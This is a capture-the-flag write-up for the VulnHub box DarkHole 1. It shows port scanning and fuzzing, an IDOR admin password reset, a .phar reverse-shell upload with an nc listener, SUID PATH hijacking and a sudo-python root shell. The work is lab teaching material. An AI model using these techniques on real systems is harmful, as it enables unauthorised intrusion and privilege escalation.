---
{"dg-publish":true,"permalink":"/write-ups/vuln-hub/dark-hole-1/","tags":["CTF","write-up","#SUID","#sudo-l"]}
---


![Pasted image 20241204220755.png|300](/img/user/attachments/Pasted%20image%2020241204220755.png)

---
> [!INFO] Info about DarkHole - 1
>  It's a box for beginners, but not easy, Good Luck

> [!FAQ]- Hints
> Don't waste your time For Brute-Force

---
# Active reconnaissance

## Port scan
Executing a fast general scan to all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

---
# Enumeration
Executing a deep scan with common scripts only to ports that we are interested.
```shell
sudo nmap TARGET_IP -sCV -p 22,80 -oN nmap_enum
```
## OS
Linux, ubuntu
## Port 22 - SSH
22/tcp open  ssh     **OpenSSH 8.2p1** Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
## Port 80 - Apache
80/tcp open  http    **Apache** httpd **2.4.41** ((Ubuntu))
http-title: DarkHole
http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Add the IP to `/etc/hosts` (optionally)
```shell
sudo echo "192.168.122.12 darkhole.vh" | sudo tee -a /etc/hosts
```
The webpage:
![Pasted image 20241205093541.png|700](/img/user/attachments/Pasted%20image%2020241205093541.png)

Login page:
![Pasted image 20241205093831.png|600](/img/user/attachments/Pasted%20image%2020241205093831.png)
### Fuzz
```shell
ffuf -c -t 100 -u http://darkhole.vh/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -mc all -fc 404 -e .php,.html,.txt
```
![Pasted image 20241205101239.png](/img/user/attachments/Pasted%20image%2020241205101239.png)

---
# Exploitation
## Port 80
### Dashboard misconfiguration
First go to log in then create a new account and access it
![Pasted image 20241205160247.png](/img/user/attachments/Pasted%20image%2020241205160247.png)
We have the id number *2* this suggest that the the admin id number is *1*
After try some things on the panel, I intercept the request when clicked on the *Change* botton of password (using *BurpSuite*)
![Pasted image 20241205160534.png](/img/user/attachments/Pasted%20image%2020241205160534.png)
![Pasted image 20241205160822.png](/img/user/attachments/Pasted%20image%2020241205160822.png)
It's interesting that the *id* number is sent with the password, so I change to 1 to try to change the admin password and apparently works
![Pasted image 20241205161025.png](/img/user/attachments/Pasted%20image%2020241205161025.png)

Try to log in as *admin* with the new password *password123*
![Pasted image 20241205161129.png|500](/img/user/attachments/Pasted%20image%2020241205161129.png)
It works
![Pasted image 20241205161254.png](/img/user/attachments/Pasted%20image%2020241205161254.png)
### Upload vulnerability
If we try to upload a *PHP* reverse sell (`/usr/share/webshells/php/php-reverse-shell.php`) it's not allowed, only some types are allowed.
![Pasted image 20241205161902.png|300](/img/user/attachments/Pasted%20image%2020241205161902.png)
To bypass change the extension to `.phar` and should be uploaded.

Start the listener on the attacker machine
```shell
rlwrap nc -lnvp 4747
```

On the browser or burpsuite go to the file uploaded path
`http://darkhole.vh/upload/php-reverse-shell.phar`

We have a reverse shell as `www-data`
![Pasted image 20241205182522.png](/img/user/attachments/Pasted%20image%2020241205182522.png)

---

# Privilege escalation
We have 3 interesting users
![Pasted image 20241205182915.png](/img/user/attachments/Pasted%20image%2020241205182915.png)
Go to `/home/john/`, there are some files
![Pasted image 20241205205815.png](/img/user/attachments/Pasted%20image%2020241205205815.png)
I'll focus on the SUID *toto* file 
## SUID Path exploiting
It's an executable when I execute, I suppose its executing the `id` command as `john` user:
![Pasted image 20241205210151.png](/img/user/attachments/Pasted%20image%2020241205210151.png)
If the path to `id` is not set with the complete path of the command (`/usr/bin/id`) and the *PATH* is editable we can exploit it to force *toto* to execute our malicious binary instead of the original `id` binary. 
In this case I'll leverage this to copy the *bash* to get a shell
1. Copy the file
   ```shell
   cp /bin/bash /tmp/id
   ```
2. Edit the *PATH* to set first */tmp* directory
   ```shell
   export PATH=/tmp:$PATH
   ```
   Now the path is:
   ![Pasted image 20241206083010.png](/img/user/attachments/Pasted%20image%2020241206083010.png)
1. Execute `toto` and we have a shell as *john*
   ```shell
   ./toto
   ```
   ![Pasted image 20241205210952.png](/img/user/attachments/Pasted%20image%2020241205210952.png)
   
> [!check] user flag
> ![Pasted image 20241205211221.png](/img/user/attachments/Pasted%20image%2020241205211221.png)

Furthermore I found the password of *john*
![Pasted image 20241205211630.png|300](/img/user/attachments/Pasted%20image%2020241205211630.png)
To get a more stable shell, I recommend connect through *SSH*.
## sudo -l
Now we are *john*
Check `sudo -ĺ` and enter the password. We have *python* and *file.py*
![Pasted image 20241205212323.png](/img/user/attachments/Pasted%20image%2020241205212323.png)
This means we can execute as *root*
```shell
sudo /usr/bin/python3 /home/john/file.py
```
But the file *file.py* is empty
Check *gtfobins* and we have a way to exploit this
```
sudo python -c 'import os; os.system("/bin/sh")'
```
Write this into the *file.py*
*file.py*:
```
#!/usr/bin/env python3
import os; os.system("/bin/sh")
```
And execute it:
```shell
sudo /usr/bin/python3 /home/john/file.py
```
![Pasted image 20241206081409.png](/img/user/attachments/Pasted%20image%2020241206081409.png)
> [!check] user flag
> ![Pasted image 20241206081547.png](/img/user/attachments/Pasted%20image%2020241206081547.png)

---